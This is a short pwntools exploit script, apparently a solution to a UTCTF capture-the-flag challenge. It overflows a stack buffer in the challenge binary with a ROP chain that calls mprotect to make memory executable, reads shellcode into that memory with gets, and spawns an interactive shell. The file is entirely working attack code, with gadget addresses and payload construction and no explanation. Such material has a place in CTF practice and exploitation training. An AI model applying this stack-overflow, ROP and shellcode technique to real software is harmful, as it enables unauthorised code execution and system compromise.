from pwn import *

e = ELF("./fs/pwnable")

context.binary = e

if "--remote" in sys.argv:
  p = remote("kernel.utctf.live", 9051)
else:
  #p = process(e.path)
  p = process("./cmd.sh")

rdi = (0x4267a0)
sys_rbx = (0x0042431e)
rsi = (0x0049cc07)
rax = (0x0044ef17)
rdx_rbx = (0x004956e0)

buff = 0x00000000004cd000

p.sendlineafter("How old are you?", "-1")
p.sendlineafter("call?", "A")
p.sendlineafter("message:", "\x00" * 0x108 
  + p64(rdi) + p64(buff // 0x1000 * 0x1000)
  + p64(rsi) + p64(0x10000)
  + p64(rdx_rbx) + p64(0x7) + p64(0) 
  + p64(e.symbols["mprotect"])
  + p64(rdi) + p64(buff)
  + p64(e.symbols["gets"])
  + p64(buff)
)

ui.pause()

pay = asm(shellcraft.sh())

p.sendline(pay)

p.interactive()
